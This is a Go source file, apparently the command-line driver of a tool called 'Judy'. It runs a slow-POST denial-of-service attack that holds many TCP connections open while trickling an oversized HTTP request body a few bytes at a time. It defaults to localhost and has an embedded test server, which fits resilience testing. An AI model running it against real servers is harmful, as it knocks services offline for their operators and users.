package judy

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
	"unicode"

	"github.com/andrewflbarnes/snacks/internal/helper"
	"github.com/andrewflbarnes/snacks/pkg/http"
	"github.com/andrewflbarnes/snacks/pkg/judy"
	log "github.com/sirupsen/logrus"
)

var (
	logger = log.WithFields(log.Fields{})

	flagsJudy = flag.NewFlagSet("judy", flag.ExitOnError)
	flagOnce  = flagsJudy.Bool("once", false, "Establish a single connection")
	flagTime  = flagsJudy.Duration("time", time.Hour, "How long to run the test for (not applicable if -once enabled)")
	flagTest  = flagsJudy.Bool("test", false, "Runs an embedded server to connect to")
	flagHost  = flagsJudy.String("host", "localhost", "The host to send the payload to")
	flagPath  = flagsJudy.String("path", "/", "The path to send the request to")
	flagPort  = flagsJudy.Int("port", 80, "The port to send the payload to")
	flagSize  = flagsJudy.Int("size", 1_000_000, "The size of the request payload to send")
	flagDelay = flagsJudy.Int("sd", 1000, "The delay in ms between each send")
	flagBytes = flagsJudy.Int("sb", 5, "The number of bytes to send in each send")
	flagMax   = flagsJudy.Int("max", 1000, "The maximum number of connections to establish")
)

func Judy() {
	logFlags := helper.InitLogFlags(flagsJudy)
	flagsJudy.Parse(os.Args[2:])
	logFlags.Apply()

	port := *flagPort
	test := *flagTest
	host := *flagHost
	size := *flagSize
	once := *flagOnce
	sendBytes := *flagBytes
	sendDelay := *flagDelay
	duration := *flagTime
	maxConns := *flagMax

	logger.Info("Starting")

	// Create a new Judy instance
	sendStrategy := judy.NewFixedByteSendStrategy(sendBytes, sendDelay)
	l := judy.NewJudy(sendStrategy, maxConns)

	if test {
		// Start a server which will receive the payload
		serverReady := make(chan bool)
		go helper.HttpServer(port, serverReady)
		<-serverReady
	}

	prefix := getPayloadPrefix()

	if once {
		logExecutionDetails("single", prefix)

		executeOnce(l, prefix)

		logger.Info("Judy attack complete")
	} else {
		logExecutionDetails("continuous", prefix)

		go l.ExecuteContinuous(host, port, prefix, size)

		time.Sleep(duration)
		l.Stop()

		logger.WithFields(log.Fields{
			"duration": duration,
		}).Info("Judy attack complete")

		time.Sleep(time.Duration(sendDelay) * time.Millisecond)
	}
}

func logExecutionDetails(execution string, prefix []byte) {
	if isPrintable(prefix) {
		logger.Infof("Prefix:\n%s", prefix)
	}
	logger.WithFields(log.Fields{
		"type":      execution,
		"target":    fmt.Sprintf("%s:%d", *flagHost, *flagPort),
		"size":      *flagSize,
		"duration":  *flagTime,
		"test":      *flagTest,
		"sendBytes": *flagBytes,
		"sendDelay": *flagDelay,
		"maxConns":  *flagMax,
	}).Info("Starting Judy attack")
}

func isPrintable(bytes []byte) bool {
	for _, c := range string(bytes) {
		if !unicode.IsPrint(c) &&
			c != '\n' &&
			c != '\r' &&
			c != '\t' {
			return false
		}
	}
	return true
}

func executeOnce(l judy.Judy, prefix []byte) {
	host := *flagHost
	port := *flagPort
	size := *flagSize

	target := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		logger.WithFields(log.Fields{
			"target": target,
		}).Fatal("Unable to establish connection")
	}

	done := l.Execute(conn, prefix, size)
	// Wait for the payload to finish sending
	<-done
}

func getPayloadPrefix() []byte {
	// if http...
	return getHTTPPayload(http.Post, helper.ApplicationJsonPrefix)
}

func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
	host := *flagHost
	port := *flagPort
	size := *flagSize
	endpoint := *flagPath

	contentTypePrefix := media.Prefix()
	contentTypePrefixLen := len(contentTypePrefix)

	headers := map[string]string{
		"Content-Type":   media.Name(),
		"Accept":         "*/*",
		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
		"Host":           host + ":" + strconv.Itoa(port),
	}

	builder := http.HttpRequestBuilder{
		Proto:    http.Http11,
		Verb:     verb,
		Endpoint: endpoint,
		Body:     "",
		Headers:  headers,
	}

	httpRequest := builder.BuildBytes()
	return append(httpRequest, contentTypePrefix...)
}
